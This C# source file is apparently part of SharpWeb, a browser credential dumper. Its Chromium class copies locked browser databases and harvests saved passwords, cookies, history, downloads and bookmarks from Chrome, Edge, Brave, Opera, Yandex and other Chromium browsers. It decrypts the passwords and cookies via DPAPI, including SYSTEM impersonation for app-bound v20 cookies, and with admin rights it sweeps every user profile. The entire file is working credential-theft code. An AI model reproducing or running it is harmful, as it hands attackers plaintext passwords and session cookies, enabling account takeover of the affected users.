using System;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static SharpWeb.Browsers.GetKey;
using SharpWeb.Utilities;
using static SharpWeb.Utilities.Current;
using static SharpWeb.Display.OutputFormatting;

namespace SharpWeb.Browsers
{
    public class Chromium
    {
        public static string browser_name;
        public static void Histroy(string chrome_History_path, string browser_name)
        {
            try
            {
                string[] header = new string[] { "URL", "TITLE", "AccessDate" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_history");
                string History_tempFile = CreateTmpFile(chrome_History_path);

                SQLiteHandler sqlDatabase = new SQLiteHandler(History_tempFile);
                if (sqlDatabase.ReadTable("urls"))
                {
                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        string url = sqlDatabase.GetValue(i, "url");
                        string title = sqlDatabase.GetValue(i, "title");

                        long lastDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "last_visit_time"), out lastDate);
                        PrintNorma("    ---------------------------------------------------------");
                        PrintSuccess(String.Format("URL: {0}", url), 1);
                        PrintSuccess(String.Format("TITLE: {0}", title), 1);
                        PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                        data.Add(new string[] { url, title, TypeUtil.TimeEpoch(lastDate).ToString() });
                    }
                }


                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(History_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_History_path), 1);
            }
            Console.WriteLine();
        }

        public static void Download(string chrome_Download_path, string browser_name)
        {
            try
            {
                string Download_tempFile = CreateTmpFile(chrome_Download_path);

                string[] header = new string[] { "URL", "PATH", "TIME" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_download");

                SQLiteHandler sqlDatabase = new SQLiteHandler(Download_tempFile);
                if (sqlDatabase.ReadTable("downloads"))
                {
                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        string path = sqlDatabase.GetValue(i, "current_path");
                        string url = sqlDatabase.GetValue(i, "tab_url");
                        long lastDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "last_access_time"), out lastDate);

                        PrintNorma("    ---------------------------------------------------------");
                        PrintSuccess(String.Format("URL: {0}", url), 1);
                        PrintSuccess(String.Format("PATH: {0}", path), 1);
                        PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                        data.Add(new string[] { url, path, TypeUtil.TimeEpoch(lastDate).ToString() });
                    }
                }

                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(Download_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_Download_path), 1);
            }
            Console.WriteLine();
        }

        private static string PathCookie(string chrome_cookie_path)
        {
            string cookie_tempFile = string.Empty;
            try
            {
                cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_cookie_path, cookie_tempFile, true);
            }
            catch
            {
                byte[] ckfile = UnlockFile.ReadLockedFile(chrome_cookie_path);
                if (ckfile != null)
                {
                    File.WriteAllBytes(cookie_tempFile, ckfile);
                }
            }
            return cookie_tempFile;
        }

        public static byte[] SystemKey = null;

        public static void Cookies(string chrome_cookie_path, string chrome_state_file)
        {
            try
            {
                string cookie_data_tempFile = PathCookie(chrome_cookie_path);
                string state_file = File.ReadAllText(chrome_state_file);

                if (state_file.Contains("app_bound_encrypted_key"))
                {
                    Impersonator impersonator = new Impersonator();
                    impersonator.Start();
                    SystemKey = DecryptWithSystemDPAPI(chrome_state_file);
                    impersonator.Close();
                }

                string[] Jsonheader = new string[] { "domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value" };
                List<string[]> Jsondata = new List<string[]> { };

                string[] header = new string[] { "HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "HasExpire", "IsPersistent", "CreateDate", "ExpireDate", "AccessDate" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_cookie");
                SQLiteHandler sqlDatabase = new SQLiteHandler(cookie_data_tempFile);
                if (sqlDatabase.ReadTable("cookies"))
                {
                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        long creDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "creation_utc"), out creDate);

                        string host_key = sqlDatabase.GetValue(i, "host_key");

                        string name = sqlDatabase.GetValue(i, "name");

                        string encryptedCookie = sqlDatabase.GetValue(i, "encrypted_value");

                        string path = sqlDatabase.GetValue(i, "path");

                        long expDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "expires_utc"), out expDate);

                        long lastDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "last_access_utc"), out lastDate);

                        string IsSecure = is_true_false(sqlDatabase.GetValue(i, "is_secure"));

                        string http_only = is_true_false(sqlDatabase.GetValue(i, "is_httponly"));

                        string HasExpire = is_true_false(sqlDatabase.GetValue(i, "has_expires"));

                        string IsPersistent = is_true_false(sqlDatabase.GetValue(i, "is_persistent"));
                        string sameSiteString = TryParsesameSite(sqlDatabase.GetValue(i, "samesite"));

                        string cookie_value = null;

                        byte[] buffer = Convert.FromBase64String(encryptedCookie);
                        string bufferString = Encoding.UTF8.GetString(Convert.FromBase64String(encryptedCookie));
                        if (bufferString.StartsWith("v20"))
                        {
                            byte[] key = DecryptWithUserDPAPI(SystemKey, chrome_state_file);
                            byte[] iv = new byte[12];
                            Array.Copy(buffer, 3, iv, 0, 12);
                            byte[] cipherText = new byte[buffer.Length - 15];
                            Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                            byte[] tag = new byte[16];
                            Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                            byte[] data1 = new byte[cipherText.Length - tag.Length];
                            Array.Copy(cipherText, 0, data1, 0, cipherText.Length - tag.Length);
                            byte[] decryptedData = new AesGcm().Decrypt(key, iv, null, data1, tag);
                            if (decryptedData != null)
                            {
                                cookie_value = Encoding.UTF8.GetString(decryptedData.Skip(32).ToArray());
                            }
                        }
                        else
                        {
                            byte[] masterKey = GetMasterKey(chrome_state_file);
                            cookie_value = DecryptData(Convert.FromBase64String(encryptedCookie), masterKey);
                        }

                        PrintNorma("    ---------------------------------------------------------");
                        PrintSuccess(String.Format("HOST: {0}", host_key), 1);
                        PrintSuccess(String.Format("COOKIE: {0}={1}", name, cookie_value), 1);
                        PrintSuccess(String.Format("CreateDate: {0}", TypeUtil.TimeEpoch(creDate)), 1);
                        PrintSuccess(String.Format("ExpireDate: {0}", TypeUtil.TimeEpoch(expDate)), 1);
                        PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                        PrintSuccess(String.Format("Path: {0}", path), 1);
                        string cookie = String.Format("{0}={1}", name, cookie_value);

                        Jsondata.Add(new string[] { host_key, expDate.ToString(), "false", http_only, name, path, sameSiteString, IsSecure, "true", "0", cookie_value });
                        data.Add(new string[] { host_key, cookie, path, IsSecure, http_only, HasExpire, IsPersistent, TypeUtil.TimeEpoch(creDate).ToString(), TypeUtil.TimeEpoch(expDate).ToString(), TypeUtil.TimeEpoch(lastDate).ToString() });
                    }
                }

                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(Jsonheader, Jsondata, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(cookie_data_tempFile);
            }
            catch
            {
                PrintFail("Not Found SystemKey OR Not Administrator Privileges!", 1);
            }
            Console.WriteLine();
        }

        public static void Bookmark(string chrome_book_path)
        {
            try
            {
                string tempFile = CreateTmpFile(chrome_book_path);
                string booktext = File.ReadAllText(tempFile);
                Utilities.Bookmark.Treat(booktext);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_book_path), 1);
            }
        }

        public static void Logins(string login_data_path, string chrome_state_file)
        {
            try
            {
                string login_data_tempFile = CreateTmpFile(login_data_path);

                string[] header = new string[] { "URL", "USERNAME", "PASSWORD", "CreateDate" };

                List<string[]> data = new List<string[]> { };
                string fileName = Path.Combine("out", browser_name + "_password");

                SQLiteHandler sqlDatabase = new SQLiteHandler(login_data_tempFile);

                if (sqlDatabase.ReadTable("logins"))
                {
                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        string url = sqlDatabase.GetValue(i, "origin_url");
                        string username = sqlDatabase.GetValue(i, "username_value");

                        long creDate;
                        Int64.TryParse(sqlDatabase.GetValue(i, "date_created"), out creDate);


                        byte[] masterKey = GetMasterKey(chrome_state_file);
                        string password = DecryptData(Convert.FromBase64String(sqlDatabase.GetValue(i, "password_value")), masterKey);

                        PrintNorma("    ---------------------------------------------------------");
                        data.Add(new string[] { url, username, password, TypeUtil.TimeEpoch(creDate).ToString() });
                        PrintSuccess(String.Format("{0}: {1}", "URL", url), 1);
                        PrintSuccess(String.Format("{0}: {1}", "USERNAME", username), 1);
                        PrintSuccess(String.Format("{0}: {1}", "PASSWORD", password), 1);
                        PrintSuccess(String.Format("{0}: {1}", "CreateDate", TypeUtil.TimeEpoch(creDate).ToString()), 1);
                    }
                }


                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(login_data_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found OR Decryption failed!", login_data_path), 1);
            }

            Console.WriteLine();

        }

        public static void GetChromium(string[] name)
        {
            try
            {
                browser_name = name[0];

                if (IsHighIntegrity())
                {
                    //未解决，待添加域backupkey
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        if (dir.Contains("All Users") || dir.Contains("Public") || dir.Contains("Default"))
                            continue;
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        string userChromeHistoryPath = String.Format("{0}{1}\\History", dir, name[1]);
                        string userChromeBookmarkPath = String.Format("{0}{1}\\Bookmarks", dir, name[1]);
                        string userChromeLoginDataPath = String.Format("{0}{1}\\Login Data", dir, name[1]);
                        string userChromeCookiesPath = String.Format("{0}{1}\\Cookies", dir, name[1]);
                        string path;
                        if (name[1].Contains("Default"))
                        {
                            path = name[1].Replace("\\Default", string.Empty);
                        }
                        else
                        {
                            path = name[1];
                        }

                        string userChromeStatePath = String.Format("{0}{1}\\Local State", Environment.GetEnvironmentVariable("USERPROFILE"), path);
                        string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeLoginDataPath, userChromeCookiesPath, userChromeStatePath };
                        if (FileExists(chromePaths))
                        {
                            Console.WriteLine(String.Format("========================== {0} (All Users) ==========================", name[0]));
                            PrintVerbose(String.Format("Get {0} Login Data", name[0]));
                            Logins(userChromeLoginDataPath, userChromeStatePath);

                            PrintVerbose(String.Format("Get {0} Bookmarks", name[0]));
                            Bookmark(userChromeBookmarkPath);
                            Console.WriteLine();
                            try
                            {
                                bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);

                                if (!old_chrome_cookie_path)
                                    userChromeCookiesPath = dir + name[1] + @"\Network\Cookies";
                                PrintVerbose(String.Format("Get {0} Cookie", name[0]));
                                Cookies(userChromeCookiesPath, userChromeStatePath);
                            }
                            catch
                            {
                                PrintFail(String.Format("Not Found SystemKey OR Not Administrator Privileges!"), 1);
                                Console.WriteLine();
                            }
                            PrintVerbose(String.Format("Get {0} History", name[0]));
                            Histroy(userChromeHistoryPath, name[0]);
                            PrintVerbose(String.Format("Get {0} Downloads", name[0]));
                            Download(userChromeHistoryPath, name[0]);
                        }
                    }
                }
                else
                {
                    string userChromeHistoryPath = String.Format("{0}{1}\\History", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeBookmarkPath = String.Format("{0}{1}\\Bookmarks", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeLoginDataPath = String.Format("{0}{1}\\Login Data", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeCookiesPath = String.Format("{0}{1}\\Cookies", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string path;
                    if (name[1].Contains("Default"))
                    {
                        path = name[1].Replace("\\Default", string.Empty);
                    }
                    else
                    {
                        path = name[1];
                    }
                    string userChromeStatePath = String.Format("{0}{1}\\Local State", Environment.GetEnvironmentVariable("USERPROFILE"), path);
                    string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
                    if (FileExists(chromePaths))
                    {
                        Console.WriteLine(String.Format("========================== {0} (Current Users) ==========================", name[0]));
                        PrintVerbose(String.Format("Get {0} Login Data", name[0]));
                        Logins(userChromeLoginDataPath, userChromeStatePath);

                        PrintVerbose(String.Format("Get {0} Bookmarks", name[0]));
                        Bookmark(userChromeBookmarkPath);
                        Console.WriteLine();

                        try
                        {
                            bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);

                            if (!old_chrome_cookie_path)
                                userChromeCookiesPath = Environment.GetEnvironmentVariable("USERPROFILE") + name[1] + @"\Network\Cookies";
                            PrintVerbose(String.Format("Get {0} Cookie", name[0]));
                            Cookies(userChromeCookiesPath, userChromeStatePath);
                        }
                        catch
                        {
                            PrintFail(String.Format("Not Found SystemKey OR Not Administrator Privileges!"), 1);
                            Console.WriteLine();
                        }
                        PrintVerbose(String.Format("Get {0} History", name[0]));
                        Histroy(userChromeHistoryPath, name[0]);
                        PrintVerbose(String.Format("Get {0} Downloads", name[0]));
                        Download(userChromeHistoryPath, name[0]);
                        Console.WriteLine();
                    }
                }
            }
            catch
            {
                PrintFail("Not Found");
            }
        }

        public static void Chromium_kernel()
        {
            string[][] name = new string[][]
            {
                new string[] { "Chrome", "\\AppData\\Local\\Google\\Chrome\\User Data\\Default" } ,
                new string[]{ "Chrome Beta", "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default" },
                new string[]{ "Chromium", "\\AppData\\Local\\Chromium\\User Data\\Default" },
                new string[]{ "Edge", "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default" },
                new string[]{ "360 Speed", "\\AppData\\Local\\360chrome\\Chrome\\User Data\\Default" },
                new string[]{ "360 Speed X", "\\AppData\\Local\\360ChromeX\\Chrome\\User Data\\Default" },
                new string[]{ "Brave", "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default" },
                new string[]{ "QQ", "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default" },
                new string[]{ "Opera", "\\AppData\\Roaming\\Opera Software\\Opera Stable" },
                new string[]{ "OperaGX", "\\AppData\\Roaming\\Opera Software\\Opera GX Stable" },
                new string[]{ "Vivaldi", "\\AppData\\Local\\Vivaldi\\User Data\\Default" },
                new string[]{ "CocCoc", "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Default" },
                new string[]{ "Yandex", "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default" },
                new string[]{ "DCBrowser", "\\AppData\\Local\\DCBrowser\\User Data\\Default" },
                new string[]{ "Old Sogou", "\\AppData\\Roaming\\SogouExplorer\\Webkit\\Default" },
                new string[]{ "New Sogou", "\\AppData\\Local\\Sogou\\SogouExplorer\\User Data\\Default" }
            };
            foreach (var n in name)
            {
                GetChromium(n);
            }
        }

        public static void Specify_path(string names, string paths)
        {
            browser_name = names;
            string userChromeHistoryPath = String.Format("{0}\\History", paths);
            string userChromeBookmarkPath = String.Format("{0}\\Bookmarks", paths);
            string userChromeLoginDataPath = String.Format("{0}\\Login Data", paths);
            string userChromeCookiesPath = String.Format("{0}\\Cookies", paths);
            string path;
            if (paths.Contains("Default"))
            {
                path = paths.Replace("\\Default", string.Empty);
            }
            else
            {
                path = paths;
            }
            string userChromeStatePath = String.Format("{0}\\Local State", path);
            string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
            if (FileExists(chromePaths))
            {
                Console.WriteLine(String.Format("========================== {0} (Current Users) ==========================", names));
                PrintVerbose(String.Format("Get {0} Login Data", names));
                Logins(userChromeLoginDataPath, userChromeStatePath);

                PrintVerbose(String.Format("Get {0} Bookmarks", names));
                Bookmark(userChromeBookmarkPath);
                Console.WriteLine();
                try
                {
                    bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);
                    if (!old_chrome_cookie_path)
                        userChromeCookiesPath = paths + @"\Network\Cookies";
                    PrintVerbose(String.Format("Get {0} Cookie", names));
                    Cookies(userChromeCookiesPath, userChromeStatePath);
                }
                catch
                {
                    PrintFail(String.Format("Not Found SystemKey OR Not Administrator Privileges!"), 1);
                    Console.WriteLine();
                }
                PrintVerbose(String.Format("Get {0} History", names));
                Histroy(userChromeHistoryPath, names);
                PrintVerbose(String.Format("Get {0} Downloads", names));
                Download(userChromeHistoryPath, names);
                Console.WriteLine();
            }

        }
    }
}
